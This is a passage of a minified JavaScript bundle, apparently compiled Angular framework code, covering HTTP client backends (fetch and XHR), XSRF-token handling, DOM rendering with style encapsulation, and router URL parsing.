c.body}));case"text":return a.pipe(X(c=>{if(c.body!==null&&typeof c.body!="string")throw new Error("Response is not a string.");return c.body}));case"json":default:return a.pipe(X(c=>c.body))}case"response":return a;default:throw new Error(`Unreachable: unhandled observe type ${i.observe}}`)}}delete(t,r={}){return this.request("DELETE",t,r)}get(t,r={}){return this.request("GET",t,r)}head(t,r={}){return this.request("HEAD",t,r)}jsonp(t,r){return this.request("JSONP",t,{params:new oi().append(r,"JSONP_CALLBACK"),observe:"body",responseType:"json"})}options(t,r={}){return this.request("OPTIONS",t,r)}patch(t,r,i={}){return this.request("PATCH",t,by(i,r))}post(t,r,i={}){return this.request("POST",t,by(i,r))}put(t,r,i={}){return this.request("PUT",t,by(i,r))}static \u0275fac=function(r){return new(r||n)(L(Ic))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),oL=/^\)\]\}',?\n/,sL="X-Request-URL";function vT(n){if(n.url)return n.url;let e=sL.toLocaleLowerCase();return n.headers.get(e)}var aL=(()=>{class n{fetchImpl=V(Ay,{optional:!0})?.fetch??((...t)=>globalThis.fetch(...t));ngZone=V(pe);handle(t){return new se(r=>{let i=new AbortController;return this.doRequest(t,i.signal,r).then(My,o=>r.error(new ii({error:o}))),()=>i.abort()})}doRequest(t,r,i){return R(this,null,function*(){let o=this.createRequestInit(t),s;try{let y=this.ngZone.runOutsideAngular(()=>this.fetchImpl(t.urlWithParams,U({signal:r},o)));cL(y),i.next({type:si.Sent}),s=yield y}catch(y){i.error(new ii({error:y,status:y.status??0,statusText:y.statusText,url:t.urlWithParams,headers:y.headers}));return}let a=new Er(s.headers),c=s.statusText,l=vT(s)??t.urlWithParams,h=s.status,p=null;if(t.reportProgress&&i.next(new ph({headers:a,status:h,statusText:c,url:l})),s.body){let y=s.headers.get("content-length"),D=[],b=s.body.getReader(),T=0,F,$,P=typeof Zone<"u"&&Zone.current;yield this.ngZone.runOutsideAngular(()=>R(this,null,function*(){for(;;){let{done:Z,value:K}=yield b.read();if(Z)break;if(D.push(K),T+=K.length,t.reportProgress){$=t.responseType==="text"?($??"")+(F??=new TextDecoder).decode(K,{stream:!0}):void 0;let E=()=>i.next({type:si.DownloadProgress,total:y?+y:void 0,loaded:T,partialText:$});P?P.run(E):E()}}}));let G=this.concatChunks(D,T);try{let Z=s.headers.get("Content-Type")??"";p=this.parseBody(t,G,Z)}catch(Z){i.error(new ii({error:Z,headers:new Er(s.headers),status:s.status,statusText:s.statusText,url:vT(s)??t.urlWithParams}));return}}h===0&&(h=p?IT:0),h>=200&&h<300?(i.next(new Cc({body:p,headers:a,status:h,statusText:c,url:l})),i.complete()):i.error(new ii({error:p,headers:a,status:h,statusText:c,url:l}))})}parseBody(t,r,i){switch(t.responseType){case"json":let o=new TextDecoder().decode(r).replace(oL,"");return o===""?null:JSON.parse(o);case"text":return new TextDecoder().decode(r);case"blob":return new Blob([r],{type:i});case"arraybuffer":return r.buffer}}createRequestInit(t){let r={},i=t.withCredentials?"include":void 0;if(t.headers.forEach((o,s)=>r[o]=s.join(",")),t.headers.has("Accept")||(r.Accept="application/json, text/plain, */*"),!t.headers.has("Content-Type")){let o=t.detectContentTypeHeader();o!==null&&(r["Content-Type"]=o)}return{body:t.serializeBody(),method:t.method,headers:r,credentials:i}}concatChunks(t,r){let i=new Uint8Array(r),o=0;for(let s of t)i.set(s,o),o+=s.length;return i}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),Ay=class{};function My(){}function cL(n){n.then(My,My)}function DT(n,e){return e(n)}function uL(n,e){return(t,r)=>e.intercept(t,{handle:i=>n(i,r)})}function lL(n,e,t){return(r,i)=>qt(t,()=>e(r,o=>n(o,i)))}var dL=new j(""),Ry=new j(""),hL=new j(""),CT=new j("",{providedIn:"root",factory:()=>!0});function fL(){let n=null;return(e,t)=>{n===null&&(n=(V(dL,{optional:!0})??[]).reduceRight(uL,DT));let r=V(pr);if(V(CT)){let o=r.add();return n(e,t).pipe(Hr(()=>r.remove(o)))}else return n(e,t)}}var _T=(()=>{class n extends Ic{backend;injector;chain=null;pendingTasks=V(pr);contributeToStability=V(CT);constructor(t,r){super(),this.backend=t,this.injector=r}handle(t){if(this.chain===null){let r=Array.from(new Set([...this.injector.get(Ry),...this.injector.get(hL,[])]));this.chain=r.reduceRight((i,o)=>lL(i,o,this.injector),DT)}if(this.contributeToStability){let r=this.pendingTasks.add();return this.chain(t,i=>this.backend.handle(i)).pipe(Hr(()=>this.pendingTasks.remove(r)))}else return this.chain(t,r=>this.backend.handle(r))}static \u0275fac=function(r){return new(r||n)(L(fh),L(Pt))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})();var pL=/^\)\]\}',?\n/;function gL(n){return"responseURL"in n&&n.responseURL?n.responseURL:/^X-Request-URL:/m.test(n.getAllResponseHeaders())?n.getResponseHeader("X-Request-URL"):null}var wT=(()=>{class n{xhrFactory;constructor(t){this.xhrFactory=t}handle(t){if(t.method==="JSONP")throw new Y(-2800,!1);let r=this.xhrFactory;return(r.\u0275loadImpl?me(r.\u0275loadImpl()):J(null)).pipe(Le(()=>new se(o=>{let s=r.build();if(s.open(t.method,t.urlWithParams),t.withCredentials&&(s.withCredentials=!0),t.headers.forEach((b,T)=>s.setRequestHeader(b,T.join(","))),t.headers.has("Accept")||s.setRequestHeader("Accept","application/json, text/plain, */*"),!t.headers.has("Content-Type")){let b=t.detectContentTypeHeader();b!==null&&s.setRequestHeader("Content-Type",b)}if(t.responseType){let b=t.responseType.toLowerCase();s.responseType=b!=="json"?b:"text"}let a=t.serializeBody(),c=null,l=()=>{if(c!==null)return c;let b=s.statusText||"OK",T=new Er(s.getAllResponseHeaders()),F=gL(s)||t.url;return c=new ph({headers:T,status:s.status,statusText:b,url:F}),c},h=()=>{let{headers:b,status:T,statusText:F,url:$}=l(),P=null;T!==iL&&(P=typeof s.response>"u"?s.responseText:s.response),T===0&&(T=P?IT:0);let G=T>=200&&T<300;if(t.responseType==="json"&&typeof P=="string"){let Z=P;P=P.replace(pL,"");try{P=P!==""?JSON.parse(P):null}catch(K){P=Z,G&&(G=!1,P={error:K,text:P})}}G?(o.next(new Cc({body:P,headers:b,status:T,statusText:F,url:$||void 0})),o.complete()):o.error(new ii({error:P,headers:b,status:T,statusText:F,url:$||void 0}))},p=b=>{let{url:T}=l(),F=new ii({error:b,status:s.status||0,statusText:s.statusText||"Unknown Error",url:T||void 0});o.error(F)},m=!1,y=b=>{m||(o.next(l()),m=!0);let T={type:si.DownloadProgress,loaded:b.loaded};b.lengthComputable&&(T.total=b.total),t.responseType==="text"&&s.responseText&&(T.partialText=s.responseText),o.next(T)},D=b=>{let T={type:si.UploadProgress,loaded:b.loaded};b.lengthComputable&&(T.total=b.total),o.next(T)};return s.addEventListener("load",h),s.addEventListener("error",p),s.addEventListener("timeout",p),s.addEventListener("abort",p),t.reportProgress&&(s.addEventListener("progress",y),a!==null&&s.upload&&s.upload.addEventListener("progress",D)),s.send(a),o.next({type:si.Sent}),()=>{s.removeEventListener("error",p),s.removeEventListener("abort",p),s.removeEventListener("load",h),s.removeEventListener("timeout",p),t.reportProgress&&(s.removeEventListener("progress",y),a!==null&&s.upload&&s.upload.removeEventListener("progress",D)),s.readyState!==s.DONE&&s.abort()}})))}static \u0275fac=function(r){return new(r||n)(L(ys))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),bT=new j(""),mL="XSRF-TOKEN",yL=new j("",{providedIn:"root",factory:()=>mL}),vL="X-XSRF-TOKEN",_L=new j("",{providedIn:"root",factory:()=>vL}),gh=class{},wL=(()=>{class n{doc;platform;cookieName;lastCookieString="";lastToken=null;parseCount=0;constructor(t,r,i){this.doc=t,this.platform=r,this.cookieName=i}getToken(){if(this.platform==="server")return null;let t=this.doc.cookie||"";return t!==this.lastCookieString&&(this.parseCount++,this.lastToken=dh(t,this.cookieName),this.lastCookieString=t),this.lastToken}static \u0275fac=function(r){return new(r||n)(L(bt),L(Ot),L(yL))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})();function EL(n,e){let t=n.url.toLowerCase();if(!V(bT)||n.method==="GET"||n.method==="HEAD"||t.startsWith("http://")||t.startsWith("https://"))return e(n);let r=V(gh).getToken(),i=V(_L);return r!=null&&!n.headers.has(i)&&(n=n.clone({headers:n.headers.set(i,r)})),e(n)}var TT=function(n){return n[n.Interceptors=0]="Interceptors",n[n.LegacyInterceptors=1]="LegacyInterceptors",n[n.CustomXsrfConfiguration=2]="CustomXsrfConfiguration",n[n.NoXsrfProtection=3]="NoXsrfProtection",n[n.JsonpSupport=4]="JsonpSupport",n[n.RequestsMadeViaParent=5]="RequestsMadeViaParent",n[n.Fetch=6]="Fetch",n}(TT||{});function IL(n,e){return{\u0275kind:n,\u0275providers:e}}function DL(...n){let e=[xy,wT,_T,{provide:Ic,useExisting:_T},{provide:fh,useFactory:()=>V(aL,{optional:!0})??V(wT)},{provide:Ry,useValue:EL,multi:!0},{provide:bT,useValue:!0},{provide:gh,useClass:wL}];for(let t of n)e.push(...t.\u0275providers);return Nd(e)}var ET=new j("");function CL(){return IL(TT.LegacyInterceptors,[{provide:ET,useFactory:fL},{provide:Ry,useExisting:ET,multi:!0}])}var ST=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275mod=Qe({type:n});static \u0275inj=Ke({providers:[DL(CL())]})}return n})();var Py=class extends ch{supportsDOMEvents=!0},ky=class n extends Py{static makeCurrent(){rT(new n)}onAndCancel(e,t,r){return e.addEventListener(t,r),()=>{e.removeEventListener(t,r)}}dispatchEvent(e,t){e.dispatchEvent(t)}remove(e){e.remove()}createElement(e,t){return t=t||this.getDefaultDocument(),t.createElement(e)}createHtmlDocument(){return document.implementation.createHTMLDocument("fakeTitle")}getDefaultDocument(){return document}isElementNode(e){return e.nodeType===Node.ELEMENT_NODE}isShadowRoot(e){return e instanceof DocumentFragment}getGlobalEventTarget(e,t){return t==="window"?window:t==="document"?e:t==="body"?e.body:null}getBaseHref(e){let t=TL();return t==null?null:SL(t)}resetBaseElement(){bc=null}getUserAgent(){return window.navigator.userAgent}getCookie(e){return dh(document.cookie,e)}},bc=null;function TL(){return bc=bc||document.querySelector("base"),bc?bc.getAttribute("href"):null}function SL(n){return new URL(n,document.baseURI).pathname}var Oy=class{addToWindow(e){Yt.getAngularTestability=(r,i=!0)=>{let o=e.findTestabilityInTree(r,i);if(o==null)throw new Y(5103,!1);return o},Yt.getAllAngularTestabilities=()=>e.getAllTestabilities(),Yt.getAllAngularRootElements=()=>e.getAllRootElements();let t=r=>{let i=Yt.getAllAngularTestabilities(),o=i.length,s=function(){o--,o==0&&r()};i.forEach(a=>{a.whenStable(s)})};Yt.frameworkStabilizers||(Yt.frameworkStabilizers=[]),Yt.frameworkStabilizers.push(t)}findTestabilityInTree(e,t,r){if(t==null)return null;let i=e.getTestability(t);return i??(r?$n().isShadowRoot(t)?this.findTestabilityInTree(e,t.host,!0):this.findTestabilityInTree(e,t.parentElement,!0):null)}},AL=(()=>{class n{build(){return new XMLHttpRequest}static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),Fy=new j(""),PT=(()=>{class n{_zone;_plugins;_eventNameToPlugin=new Map;constructor(t,r){this._zone=r,t.forEach(i=>{i.manager=this}),this._plugins=t.slice().reverse()}addEventListener(t,r,i){return this._findPluginFor(r).addEventListener(t,r,i)}getZone(){return this._zone}_findPluginFor(t){let r=this._eventNameToPlugin.get(t);if(r)return r;if(r=this._plugins.find(o=>o.supports(t)),!r)throw new Y(5101,!1);return this._eventNameToPlugin.set(t,r),r}static \u0275fac=function(r){return new(r||n)(L(Fy),L(pe))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),mh=class{_doc;constructor(e){this._doc=e}manager},Vy="ng-app-id";function AT(n){for(let e of n)e.remove()}function MT(n,e){let t=e.createElement("style");return t.textContent=n,t}function ML(n,e,t){let r=n.head?.querySelectorAll(`style[${Vy}="${e}"]`);if(r)for(let i of r)i.textContent&&(i.removeAttribute(Vy),t.set(i.textContent,{usage:0,elements:[i]}))}function Ly(n,e){let t=e.createElement("link");return t.setAttribute("rel","stylesheet"),t.setAttribute("href",n),t}var kT=(()=>{class n{doc;appId;nonce;inline=new Map;external=new Map;hosts=new Set;isServer;constructor(t,r,i,o={}){this.doc=t,this.appId=r,this.nonce=i,this.isServer=ri(o),ML(t,r,this.inline),this.hosts.add(t.head)}addStyles(t,r){for(let i of t)this.addUsage(i,this.inline,MT);r?.forEach(i=>this.addUsage(i,this.external,Ly))}removeStyles(t,r){for(let i of t)this.removeUsage(i,this.inline);r?.forEach(i=>this.removeUsage(i,this.external))}addUsage(t,r,i){let o=r.get(t);o?o.usage++:r.set(t,{usage:1,elements:[...this.hosts].map(s=>this.addElement(s,i(t,this.doc)))})}removeUsage(t,r){let i=r.get(t);i&&(i.usage--,i.usage<=0&&(AT(i.elements),r.delete(t)))}ngOnDestroy(){for(let[,{elements:t}]of[...this.inline,...this.external])AT(t);this.hosts.clear()}addHost(t){this.hosts.add(t);for(let[r,{elements:i}]of this.inline)i.push(this.addElement(t,MT(r,this.doc)));for(let[r,{elements:i}]of this.external)i.push(this.addElement(t,Ly(r,this.doc)))}removeHost(t){this.hosts.delete(t)}addElement(t,r){return this.nonce&&r.setAttribute("nonce",this.nonce),this.isServer&&r.setAttribute(Vy,this.appId),t.appendChild(r)}static \u0275fac=function(r){return new(r||n)(L(bt),L(Qm),L(Zm,8),L(Ot))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),Ny={svg:"http://www.w3.org/2000/svg",xhtml:"http://www.w3.org/1999/xhtml",xlink:"http://www.w3.org/1999/xlink",xml:"http://www.w3.org/XML/1998/namespace",xmlns:"http://www.w3.org/2000/xmlns/",math:"http://www.w3.org/1998/Math/MathML"},jy=/%COMP%/g,OT="%COMP%",xL=`_nghost-${OT}`,RL=`_ngcontent-${OT}`,NL=!0,PL=new j("",{providedIn:"root",factory:()=>NL});function kL(n){return RL.replace(jy,n)}function OL(n){return xL.replace(jy,n)}function FT(n,e){return e.map(t=>t.replace(jy,n))}var xT=(()=>{class n{eventManager;sharedStylesHost;appId;removeStylesOnCompDestroy;doc;platformId;ngZone;nonce;rendererByCompId=new Map;defaultRenderer;platformIsServer;constructor(t,r,i,o,s,a,c,l=null){this.eventManager=t,this.sharedStylesHost=r,this.appId=i,this.removeStylesOnCompDestroy=o,this.doc=s,this.platformId=a,this.ngZone=c,this.nonce=l,this.platformIsServer=ri(a),this.defaultRenderer=new Tc(t,s,c,this.platformIsServer)}createRenderer(t,r){if(!t||!r)return this.defaultRenderer;this.platformIsServer&&r.encapsulation===jn.ShadowDom&&(r=ue(U({},r),{encapsulation:jn.Emulated}));let i=this.getOrCreateRenderer(t,r);return i instanceof yh?i.applyToHost(t):i instanceof Sc&&i.applyStyles(),i}getOrCreateRenderer(t,r){let i=this.rendererByCompId,o=i.get(r.id);if(!o){let s=this.doc,a=this.ngZone,c=this.eventManager,l=this.sharedStylesHost,h=this.removeStylesOnCompDestroy,p=this.platformIsServer;switch(r.encapsulation){case jn.Emulated:o=new yh(c,l,r,this.appId,h,s,a,p);break;case jn.ShadowDom:return new Uy(c,l,t,r,s,a,this.nonce,p);default:o=new Sc(c,l,r,h,s,a,p);break}i.set(r.id,o)}return o}ngOnDestroy(){this.rendererByCompId.clear()}static \u0275fac=function(r){return new(r||n)(L(PT),L(kT),L(Qm),L(PL),L(bt),L(Ot),L(pe),L(Zm))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),Tc=class{eventManager;doc;ngZone;platformIsServer;data=Object.create(null);throwOnSyntheticProps=!0;constructor(e,t,r,i){this.eventManager=e,this.doc=t,this.ngZone=r,this.platformIsServer=i}destroy(){}destroyNode=null;createElement(e,t){return t?this.doc.createElementNS(Ny[t]||t,e):this.doc.createElement(e)}createComment(e){return this.doc.createComment(e)}createText(e){return this.doc.createTextNode(e)}appendChild(e,t){(RT(e)?e.content:e).appendChild(t)}insertBefore(e,t,r){e&&(RT(e)?e.content:e).insertBefore(t,r)}removeChild(e,t){t.remove()}selectRootElement(e,t){let r=typeof e=="string"?this.doc.querySelector(e):e;if(!r)throw new Y(-5104,!1);return t||(r.textContent=""),r}parentNode(e){return e.parentNode}nextSibling(e){return e.nextSibling}setAttribute(e,t,r,i){if(i){t=i+":"+t;let o=Ny[i];o?e.setAttributeNS(o,t,r):e.setAttribute(t,r)}else e.setAttribute(t,r)}removeAttribute(e,t,r){if(r){let i=Ny[r];i?e.removeAttributeNS(i,t):e.removeAttribute(`${r}:${t}`)}else e.removeAttribute(t)}addClass(e,t){e.classList.add(t)}removeClass(e,t){e.classList.remove(t)}setStyle(e,t,r,i){i&(lr.DashCase|lr.Important)?e.style.setProperty(t,r,i&lr.Important?"important":""):e.style[t]=r}removeStyle(e,t,r){r&lr.DashCase?e.style.removeProperty(t):e.style[t]=""}setProperty(e,t,r){e!=null&&(e[t]=r)}setValue(e,t){e.nodeValue=t}listen(e,t,r){if(typeof e=="string"&&(e=$n().getGlobalEventTarget(this.doc,e),!e))throw new Error(`Unsupported event target ${e} for event ${t}`);return this.eventManager.addEventListener(e,t,this.decoratePreventDefault(r))}decoratePreventDefault(e){return t=>{if(t==="__ngUnwrap__")return e;(this.platformIsServer?this.ngZone.runGuarded(()=>e(t)):e(t))===!1&&t.preventDefault()}}};function RT(n){return n.tagName==="TEMPLATE"&&n.content!==void 0}var Uy=class extends Tc{sharedStylesHost;hostEl;shadowRoot;constructor(e,t,r,i,o,s,a,c){super(e,o,s,c),this.sharedStylesHost=t,this.hostEl=r,this.shadowRoot=r.attachShadow({mode:"open"}),this.sharedStylesHost.addHost(this.shadowRoot);let l=FT(i.id,i.styles);for(let p of l){let m=document.createElement("style");a&&m.setAttribute("nonce",a),m.textContent=p,this.shadowRoot.appendChild(m)}let h=i.getExternalStyles?.();if(h)for(let p of h){let m=Ly(p,o);a&&m.setAttribute("nonce",a),this.shadowRoot.appendChild(m)}}nodeOrShadowRoot(e){return e===this.hostEl?this.shadowRoot:e}appendChild(e,t){return super.appendChild(this.nodeOrShadowRoot(e),t)}insertBefore(e,t,r){return super.insertBefore(this.nodeOrShadowRoot(e),t,r)}removeChild(e,t){return super.removeChild(null,t)}parentNode(e){return this.nodeOrShadowRoot(super.parentNode(this.nodeOrShadowRoot(e)))}destroy(){this.sharedStylesHost.removeHost(this.shadowRoot)}},Sc=class extends Tc{sharedStylesHost;removeStylesOnCompDestroy;styles;styleUrls;constructor(e,t,r,i,o,s,a,c){super(e,o,s,a),this.sharedStylesHost=t,this.removeStylesOnCompDestroy=i,this.styles=c?FT(c,r.styles):r.styles,this.styleUrls=r.getExternalStyles?.(c)}applyStyles(){this.sharedStylesHost.addStyles(this.styles,this.styleUrls)}destroy(){this.removeStylesOnCompDestroy&&this.sharedStylesHost.removeStyles(this.styles,this.styleUrls)}},yh=class extends Sc{contentAttr;hostAttr;constructor(e,t,r,i,o,s,a,c){let l=i+"-"+r.id;super(e,t,r,o,s,a,c,l),this.contentAttr=kL(l),this.hostAttr=OL(l)}applyToHost(e){this.applyStyles(),this.setAttribute(e,this.hostAttr,"")}createElement(e,t){let r=super.createElement(e,t);return super.setAttribute(r,this.contentAttr,""),r}},FL=(()=>{class n extends mh{constructor(t){super(t)}supports(t){return!0}addEventListener(t,r,i){return t.addEventListener(r,i,!1),()=>this.removeEventListener(t,r,i)}removeEventListener(t,r,i){return t.removeEventListener(r,i)}static \u0275fac=function(r){return new(r||n)(L(bt))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})(),NT=["alt","control","meta","shift"],VL={"\b":"Backspace","	":"Tab","\x7F":"Delete","\x1B":"Escape",Del:"Delete",Esc:"Escape",Left:"ArrowLeft",Right:"ArrowRight",Up:"ArrowUp",Down:"ArrowDown",Menu:"ContextMenu",Scroll:"ScrollLock",Win:"OS"},LL={alt:n=>n.altKey,control:n=>n.ctrlKey,meta:n=>n.metaKey,shift:n=>n.shiftKey},UL=(()=>{class n extends mh{constructor(t){super(t)}supports(t){return n.parseEventName(t)!=null}addEventListener(t,r,i){let o=n.parseEventName(r),s=n.eventCallback(o.fullKey,i,this.manager.getZone());return this.manager.getZone().runOutsideAngular(()=>$n().onAndCancel(t,o.domEventName,s))}static parseEventName(t){let r=t.toLowerCase().split("."),i=r.shift();if(r.length===0||!(i==="keydown"||i==="keyup"))return null;let o=n._normalizeKey(r.pop()),s="",a=r.indexOf("code");if(a>-1&&(r.splice(a,1),s="code."),NT.forEach(l=>{let h=r.indexOf(l);h>-1&&(r.splice(h,1),s+=l+".")}),s+=o,r.length!=0||o.length===0)return null;let c={};return c.domEventName=i,c.fullKey=s,c}static matchEventFullKeyCode(t,r){let i=VL[t.key]||t.key,o="";return r.indexOf("code.")>-1&&(i=t.code,o="code."),i==null||!i?!1:(i=i.toLowerCase(),i===" "?i="space":i==="."&&(i="dot"),NT.forEach(s=>{if(s!==i){let a=LL[s];a(t)&&(o+=s+".")}}),o+=i,o===r)}static eventCallback(t,r,i){return o=>{n.matchEventFullKeyCode(o,t)&&i.runGuarded(()=>r(o))}}static _normalizeKey(t){return t==="esc"?"escape":t}static \u0275fac=function(r){return new(r||n)(L(bt))};static \u0275prov=W({token:n,factory:n.\u0275fac})}return n})();function jL(){ky.makeCurrent()}function BL(){return new ur}function $L(){return YC(document),document}var HL=[{provide:Ot,useValue:Cy},{provide:Ym,useValue:jL,multi:!0},{provide:bt,useFactory:$L,deps:[]}],VT=py(Yb,"browser",HL),qL=new j(""),zL=[{provide:vc,useClass:Oy,deps:[]},{provide:dy,useClass:zd,deps:[pe,Gd,vc]},{provide:zd,useClass:zd,deps:[pe,Gd,vc]}],GL=[{provide:Pd,useValue:"root"},{provide:ur,useFactory:BL,deps:[]},{provide:Fy,useClass:FL,multi:!0,deps:[bt,pe,Ot]},{provide:Fy,useClass:UL,multi:!0,deps:[bt]},xT,kT,PT,{provide:us,useExisting:xT},{provide:ys,useClass:AL,deps:[]},[]],LT=(()=>{class n{constructor(t){}static \u0275fac=function(r){return new(r||n)(L(qL,12))};static \u0275mod=Qe({type:n});static \u0275inj=Ke({providers:[...GL,...zL],imports:[dT,Zb]})}return n})();var UT=(()=>{class n{_doc;constructor(t){this._doc=t}getTitle(){return this._doc.title}setTitle(t){this._doc.title=t||""}static \u0275fac=function(r){return new(r||n)(L(bt))};static \u0275prov=W({token:n,factory:n.\u0275fac,providedIn:"root"})}return n})();var oe="primary",$c=Symbol("RouteTitle"),zy=class{params;constructor(e){this.params=e||{}}has(e){return Object.prototype.hasOwnProperty.call(this.params,e)}get(e){if(this.has(e)){let t=this.params[e];return Array.isArray(t)?t[0]:t}return null}getAll(e){if(this.has(e)){let t=this.params[e];return Array.isArray(t)?t:[t]}return[]}get keys(){return Object.keys(this.params)}};function Cs(n){return new zy(n)}function WL(n,e,t){let r=t.path.split("/");if(r.length>n.length||t.pathMatch==="full"&&(e.hasChildren()||r.length<n.length))return null;let i={};for(let o=0;o<r.length;o++){let s=r[o],a=n[o];if(s[0]===":")i[s.substring(1)]=a;else if(s!==a.path)return null}return{consumed:n.slice(0,r.length),posParams:i}}function KL(n,e){if(n.length!==e.length)return!1;for(let t=0;t<n.length;++t)if(!Hn(n[t],e[t]))return!1;return!0}function Hn(n,e){let t=n?Gy(n):void 0,r=e?Gy(e):void 0;if(!t||!r||t.length!=r.length)return!1;let i;for(let o=0;o<t.length;o++)if(i=t[o],!ZT(n[i],e[i]))return!1;return!0}function Gy(n){return[...Object.keys(n),...Object.getOwnPropertySymbols(n)]}function ZT(n,e){if(Array.isArray(n)&&Array.isArray(e)){if(n.length!==e.length)return!1;let t=[...n].sort(),r=[...e].sort();return t.every((i,o)=>r[o]===i)}else return n===e}function JT(n){return n.length>0?n[n.length-1]:null}function ci(n){return Sg(n)?n:Ji(n)?me(Promise.resolve(n)):J(n)}var QL={exact:eS,subset:tS},XT={exact:YL,subset:ZL,ignored:()=>!0};function BT(n,e,t){return QL[t.paths](n.root,e.root,t.matrixParams)&&XT[t.queryParams](n.queryParams,e.queryParams)&&!(t.fragment==="exact"&&n.fragment!==e.fragment)}function YL(n,e){return Hn(n,e)}function eS(n,e,t){if(!ro(n.segments,e.segments)||!wh(n.segments,e.segments,t)||n.numberOfChildren!==e.numberOfChildren)return!1;for(let r in e.children)if(!n.children[r]||!eS(n.children[r],e.children[r],t))return!1;return!0}function ZL(n,e){return Object.keys(e).length<=Object.keys(n).length&&Object.keys(e).every(t=>ZT(n[t],e[t]))}function tS(n,e,t){return nS(n,e,e.segments,t)}function nS(n,e,t,r){if(n.segments.length>t.length){let i=n.segments.slice(0,t.length);return!(!ro(i,t)||e.hasChildren()||!wh(i,t,r))}else if(n.segments.length===t.length){if(!ro(n.segments,t)||!wh(n.segments,t,r))return!1;for(let i in e.children)if(!n.children[i]||!tS(n.children[i],e.children[i],r))return!1;return!0}else{let i=t.slice(0,n.segments.length),o=t.slice(n.segments.length);return!ro(n.segments,i)||!wh(n.segments,i,r)||!n.children[oe]?!1:nS(n.children[oe],e,o,r)}}function wh(n,e,t){return e.every((r,i)=>XT[t](n[i].parameters,r.parameters))}var Dr=class{root;queryParams;fragment;_queryParamMap;constructor(e=new Te([],{}),t={},r=null){this.root=e,this.queryParams=t,this.fragment=r}get queryParamMap(){return this._queryParamMap??=Cs(this.queryParams),this._queryParamMap}toString(){return e2.serialize(this)}},Te=class{segments;children;parent=null;constructor(e,t){this.segments=e,this.children=t,Object.values(t).forEach(r=>r.parent=this)}hasChildren(){return this.numberOfChildren>0}get numberOfChildren(){return Object.keys(this.children).length}toString(){return Eh(this)}},no=class{path;parameters;_parameterMap;constructor(e,t){this.path=e,this.parameters=t}get parameterMap(){return this._parameterMap??=Cs(this.parameters),this._parameterMap}toString(){return iS(this)}};function JL(n,e){return ro(n,e)&&n.every((t,r)=>Hn(t.parameters,e[r].parameters))}function ro(n,e){return n.length!==e.length?!1:n.every((t,r)=>t.path===e[r].path)}function XL(n,e){let t=[];return Object.entries(n.children).forEach(([r,i])=>{r===oe&&(t=t.concat(e(i,r)))}),Object.entries(n.children).forEach(([r,i])=>{r!==oe&&(t=t.concat(e(i,r)))}),t}var Hc=(()=>{class n{static \u0275fac=function(r){return new(r||n)};static \u0275prov=W({token:n,factory:()=>new bs,providedIn:"root"})}return n})(),bs=class{parse(e){let t=new Ky(e);return new Dr(t.parseRootSegment(),t.parseQueryParams(),t.parseFragment())}serialize(e){let t=`/${Ac(e.root,!0)}`,r=r2(e.queryParams),i=typeof e.fragment=="string"?`#${t2(e.fragment)}`:"";return`${t}${r}${i}`}},e2=new bs;function Eh(n){return n.segments.map(e=>iS(e)).join("/")}function Ac(n,e){if(!n.hasChildren())return Eh(n);if(e){let t=n.children[oe]?Ac(n.children[oe],!1):"",r=[];return Object.entries(n.children).forEach(([i,o])=>{i!==oe&&r.push(`${i}:${Ac(o,!1)}`)}),r.length>0?`${t}(${r.join("//")})`:t}else{let t=XL(n,(r,i)=>i===oe?[Ac(n.children[oe],!1)]:[`${i}:${Ac(r,!1)}`]);return Object.keys(n.children).length===1&&n.children[oe]!=null?`${Eh(n)}/${t[0]}`:`${Eh(n)}/(${t.join("//")})`}}function rS(n){return encodeURIComponent(n).replace(/%40/g,"@").replace(/%3A/gi,":").replace(/%24/g,"$").replace(/%2C/gi,",")}function vh(n){return rS(n).replace(/%3B/gi,";")}function t2(n){return encodeURI(n)}function Wy(n){return rS(n).replace(/\(/g,"%28").replace(/\)/g,"%29").replace(/%26/gi,"&")}function Ih(n){return decodeURIComponent(n)}function $T(n){return Ih(n.replace(/\+/g,"%20"))}function iS(n){return`${Wy(n.path)}${n2(n.parameters)}`}function n2(n){return Object.entries(n).map(([e,t])=>`;${Wy(e)}=${Wy(t)}`).join("")}function r2(n){let e=Object.entries(n).map(([t,r])=>Array.isArray(r)?r.map(i=>`${vh(t)}=${vh(i)}`).join("&"):`${vh(t)}=${vh(r)}`).filter(t=>t);return e.length?`?${e.join("&")}`:""}var i2=/^[^\/()?;#]+/;function By(n){let e=n.match(i2);return e?e[0]:""}var o2=/^[^\/()?;=#]+/;function s2(n){let e=n.match(o2);return e?e[0]:""}var a2=/^[^=?&#]+/;function c2(n){let e=n.match(a2);return e?e[0]:""}var u2=/^[^&#]+/;function l2(n){let e=n.match(u2);return e?e[0]:""}var Ky=class{url;remaining;constructor(e){this.url=e,this.remaining=e}parseRootSegment(){return this.consumeOptional("/"),this.remaining===""||this.peekStartsWith("?")||this.peekStartsWith("#")?new Te([],{}):new Te([],this.parseChildren())}parseQueryParams(){let e={};if(this.consumeOptional("?"))do this.parseQueryParam(e);while(this.consumeOptional("&"));return e}parseFragment(){return this.consumeOptional("#")?decodeURIComponent(this.remaining):null}parseChildren(){if(this.remaining==="")return{};this.consumeOptional("/");let e=[];for(this.peekStartsWith("(")||e.push(this.parseSegment());this.peekStartsWith("/")&&!this.peekStartsWith("//")&&!this.peekStartsWith("/(");)this.capture("/"),e.push(this.parseSegment());let t={};this.peekStartsWith("/(")&&(this.capture("/"),t=this.parseParens(!0));let r={};return this.peekStartsWith("(")&&(r=this.parseParens(!1)),(e.length>0||Object.keys(t).length>0)&&(r[oe]=new Te(e,t)),r}parseSegment(){let e=By(this.remaining);if(e===""&&this.peekStartsWith(";"))throw new Y(4009,!1);return this.capture(e),new no(Ih(e),this.parseMatrixParams())}parseMatrixParams(){let e={};for(;this.consumeOptional(";");)this.parseParam(e);return e}parseParam(e){let t=s2(this.remaining);if(!t)return;this.capture(t);let r="";if(this.consumeOptional("=")){let 